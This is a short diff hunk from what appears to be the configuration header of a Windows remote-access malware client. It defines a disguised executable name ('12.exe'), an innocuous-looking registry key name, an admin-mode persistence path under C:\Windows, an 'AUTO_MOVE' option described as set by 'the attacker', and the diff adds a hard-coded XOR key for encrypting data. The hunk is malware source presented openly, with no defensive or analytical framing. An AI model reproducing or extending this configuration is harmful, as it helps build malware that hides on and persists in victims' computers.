@@ -12,6 +12,7 @@
 #define TOKEN "|GENERATE_TOKEN|" //the token
 #define NAME_PROG "12.exe" //Name of prog
 #define NAME_KEY_REGISTER  "win64" 
+#define XOR_KEY "123456789" //The key to encrypt and decrypt data using the XOR algorithm
 
 #define AUTO_MOVE false //if this is true then the program automatically moves to a predefined by the given attacker  
 #define PATH_ADMIN "C:\\Windows" //Persistence path if the client is running admin mode.
